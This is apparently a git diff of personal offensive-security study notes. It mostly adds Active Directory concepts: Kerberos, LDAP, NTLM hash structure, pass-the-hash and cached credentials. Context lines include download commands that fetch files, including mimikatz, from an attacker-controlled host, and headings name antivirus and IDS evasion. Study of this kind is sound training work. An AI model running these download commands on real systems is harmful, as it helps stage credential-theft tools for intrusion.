@@ -1,18 +1,31 @@
+- [Definitions](#definitions)
+- [Enumeration](#enumeration)
+  - [Online presence](#online-presence)
+  - [DNS](#dns)
+  - [Cloud](#cloud)
+- [Defense in Depth](#defense-in-depth)
+- [Concept of attack](#concept-of-attack)
 - [Assembly in Windows](#assembly-in-windows)
   - [Registers](#registers)
   - [Operations](#operations)
     - [Flags](#flags)
     - [Calling COnvention](#calling-convention)
     - [Memory Layout](#memory-layout)
-  - [Firewalls and AntiVirus Evasion](#firewalls-and-antivirus-evasion)
-    - [Creating Payload](#creating-payload)
-    - [Obfuscation](#obfuscation)
-    - [Signature Evasion](#signature-evasion)
-    - [Firewalls](#firewalls)
-  - [Network Security Evasion](#network-security-evasion)
-    - [IDS x IPS](#ids-x-ips)
-  - [Living Off the Land](#living-off-the-land)
-    - [Detection and Evading file transfer](#detection-and-evading-file-transfer)
+- [Firewalls and AntiVirus Evasion](#firewalls-and-antivirus-evasion)
+  - [Creating Payload](#creating-payload)
+  - [Obfuscation](#obfuscation)
+  - [Signature Evasion](#signature-evasion)
+  - [Firewalls](#firewalls)
+- [Network Security Evasion](#network-security-evasion)
+  - [IDS x IPS](#ids-x-ips)
+- [Living Off the Land](#living-off-the-land)
+  - [Detection and Evading file transfer](#detection-and-evading-file-transfer)
+- [ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)](#active-directory-domain-service-ad-ds)
+  - [Definitions](#definitions-1)
+  - [Protocols](#protocols)
+    - [Kerberos, DNS, LDAP, MSRPC](#kerberos-dns-ldap-msrpc)
+    - [NTLM Authentication](#ntlm-authentication)
+  - [Users and Machine Accounts](#users-and-machine-accounts)
 
 
 ## Definitions
@@ -107,10 +120,10 @@ intext:???? inurl:blob.core.windows.net
 |config,API, Input, |Logging,Proc, rules  |Groups, policy,|Network: Interface, address, Route |
 
 
-# Assembly in Windows
+## Assembly in Windows
 [Tryhackme - Windows x64 Assembly](https://tryhackme.com/room/win64assembly)
 
-## Registers
+### Registers
 - Variables
 - Faster to access
 - Bigger ones go to RAM = slower
@@ -130,7 +143,7 @@ intext:???? inurl:blob.core.windows.net
   - RBP = base pointer  = hold address of the bottom of the stack. To restore to the function
   - RIP = Instruction Pointer = address of **next line**
 
-## Operations
+### Operations
 - Around 1500 instructions
 - Terms
   - immediate = IM = constant
@@ -175,7 +188,7 @@ intext:???? inurl:blob.core.windows.net
   - JBE/JNA = jump if below or equal | not above
   - JA/JNBE = jump if above | not below or equal
 
-### Flags
+#### Flags
 - Result of previous operation/comparison
 - Register: EFLAGS / RFLAGS
 - Status
@@ -187,7 +200,7 @@ intext:???? inurl:blob.core.windows.net
   - Parity Flag = 1 if last 8 bits = even
   - Trap Flag = single stepping
 
-### Calling COnvention
+#### Calling COnvention
 - Several
 - How parameters arge passed to functions
 - Caller = making the call
@@ -215,7 +228,7 @@ intext:???? inurl:blob.core.windows.net
   - return via EAX
   - caller: cleans stack
 
-### Memory Layout
+#### Memory Layout
 - Segment
   - Stack = non-static local variable
   - Heap = dynamically allocated
@@ -373,3 +386,197 @@ IWR http://$ATTACKER/file.exe -UserAgent $UserAgent -OutFile
 
 - Intel Win10
   - fxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+
+## ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)
+### Definitions
+  - Domain Controler: server that runs AD. Provides AD services + control all
+  - AD: repository/database where this users/computers are
+  - Organizational Unit (OU): containers inside AD, classify user/machines. Apply policies
+    - Group Policy Objects
+      - network distribution: gpupdate /force
+      - SYSVOL: shared networ
+  - AD Domains: collection of components within AD
+  
+- Attributes = characteristics
+  - hostname, DNS name, displayName ...
+- Schema: classes users/computer
+- Domain = logical group of objects (users, computers, UO, groups)
+- Tree: several domains that begins at a single root domain
+- Forest: collection of domains
+  - collection of trees + different namespace
+  - Trust Relationshing
+- Enterprese Admins: over all domains
+- GUID = Global Unique Identifier
+  - for every object
+
+```
+# Basic Structure
+INLANEFREIGHT.LOCAL/
+├── ADMIN.INLANEFREIGHT.LOCAL
+│   ├── GPOs
+│   └── OU
+│       └── EMPLOYEES
+│           ├── COMPUTERS
+│           │   └── FILE01
+│           ├── GROUPS
+│           │   └── HQ Staff
+│           └── USERS
+│               └── barbara.jones
+├── CORP.INLANEFREIGHT.LOCAL
+└── DEV.INLANEFREIGHT.LOCAL
+```
+
+- Security Principals
+  - authenticateble, manage access to resources
+- **Security Identifier (SID)**
+  - For security principal or security group
+- Distinguished Name (DN)
+  - full path to o object 
+  - cn=pat, ou=IT, ou=Finance, dc=domain, dc=local
+- Relative Distinguished Name (RDN)
+  - component of DN
+  - cn=pat, ou=IT, ou=Finance, dc=domain, dc=local != cn=pat, dc=domain, dc=local
+- **sAMAAccountName**
+  - users logon = pat
+- userPrincipalName
+  - pat@domain.local
+- Flexible Single Master Operation
+  - Schema Master + Domain Namim Master + Relative ID (RID) Master + Primary Domain Controller Emulator + Infrastrcuture Master
+- Global Catalog (GC)
+  - copy of all object os forest
+- Read-Only Domain COntroller (RODC)
+  - no passwords chached
+- Replication 
+  - update/transfer of AD objects
+  - synchrnonization to all DCs in the forest
+- **Service Principal Name (SPN)**
+  - identifies a service instance - Kerberos authentication
+- Group Policy Object (GPO)
+  - virtual collenctions of policy settings
+- Access Controle List (ACL)
+  - Collection of Access Control Entries
+- Access Control Entries (ACE)
+  - identify trustee (user, group, logon) + list access rights
+- **Discretionary Access Control List (DACL)**
+  - Define which security principles are granted/deneis to an object
+- System Access Control Lists (SACL)
+  - Log access attempt
+- **Fully Qualified Domain Name (FQDN)**
+  - complete name of computer/hst
+  - hostname.domainname.tld = DC01.domain.local
+- Tombstone
+  - holds deleted AD objects -> attributes not preserved
+- AD Recycle bin
+  - attributes preserved
+- **SYSVOL**
+  - folder/share: copy of public files: Policies, GP, logon/logoff
+  - [More](https://networkencyclopedia.com/sysvol-share/#Components-and-Structure)
+- AdminSDHolder
+  - manage ACLs
+- dsHeuristics
+  - forest-wide configuration settings
+- adminCount
+  - 0 = user not protected
+- **NTDS.DIT**
+  - database: user,groups,hashes = important
+
+- Credentials
+  - Domain Controllers
+    - Kerberos
+    - NetNTLM
+
+- **Objects = any resource**
+  - User:
+    - People (SID + GUID)
+    - Service: database, printer, service user
+  - Contacts
+    - outsiders (GUID)
+  - Machines (SID + GUID)
+    - computer that joins AD domain
+    - DC01 = machine name | DC01$ = machine account name
+  - Shared Folders (GUID)
+  - Security Groups (SID + GUID)
+    - groups and machines
+    - Domain Admin, Server|Backup|Account Operators, Domain Users|COmputer|Controllers
+    - grant permission over resources
+  - Organizational Units (OU)
+    - container to store similar objects
+  - Domain
+    - structure of AD
+  - Domain Controllers
+    - Handle authentication requrest
+    - Enforce security policies
+  - Site
+    - set of computers across one/more subnets => make replication
+  - Built-in
+    - default groups
+  - Foreign Security Principals
+    - represent to a trusted external forest
+    - cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local
+- [Forest and Domains](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels)
+- [Functional Levels](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754918(v=ws.10)?redirectedfrom=MSDN)
+
+- Trusts
+  - authentication forest-forest domain-domain
+
+### Protocols
+#### Kerberos, DNS, LDAP, MSRPC
+- Kerberos - 88
+  - Authentication protocol
+  - DC has Key Distribution Center (KDC) = issue tickets
+    - User requests ticket from KDC ==> TGT
+    - With TGT ==> Domain Controller ==> TGS (with NTLM hash)
+    - TGS (encrypted with NTLM hahs of the service account)==> access to services
+  - Symmetrict/asymmetric - mutual authentication DomainControle/KDC
+- DNS
+  - Request name.local ==> Receives IP
+- LDAP - 389(636)
+  - Lightweight Directory Access Protocol
+  - Authentication
+    - Simple: username:password
+    - SASL = Simple Authentication and Security Layer
+  - explains HOW the systems in the network communicate with AD
+  - DC in AD listens for LDAP requests
+- MSRPC
+  - Remote Procedure Call = interprocess communication
+  - client-server
+  - Interfaces
+    - lsarcp: calls to Local Security Authority (LSA)
+    - netlogon: authenticate users in the domain
+    - samr: Remote SAM = managemnet for domain account db
+    - drsuapi: directory replication services 
+
+#### NTLM Authentication
+- LM / NTML = hash names
+- Trusted Third Party: DC
+- LM old hahs
+- NTLM: challange-response authentication protocol
+  - Stored in SAM database
+  - pass-the-hash
+```
+Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::
+
+Rachel = username
+500    = Relative Identifier (RID)
+aad3.. = LM hash
+e46b.. = NT hash = crackable + pass-the-hash
+```
+
+- **NTLM Protocol**
+  - v1
+    - challenge/response authentication ==> hash is created from it
+    - NT+LM hash = capture hash via NTML relay attack
+    - NOT pass the hash
+  - v2
+    - 2 responses to 8-byte-challange 
+      - 1o 16 Byte HMAC-MD5 + random challenge + HMAC-MD5 hash of user
+      - 2o Variable-lenght client challegne + current time + 8-byte-random + domain name
+
+- **Domain Cached Credentials (MSCache2)**
+  - Domain Cached Credentials (DCC)
+    - HKEY_LOCAL_MACHINE\SECURITY\Cache
+  - NOT pass the hash
+  - Difficult to crack
+  - 10 hahses for any domain users that logs in
+
+### Users and Machine Accounts
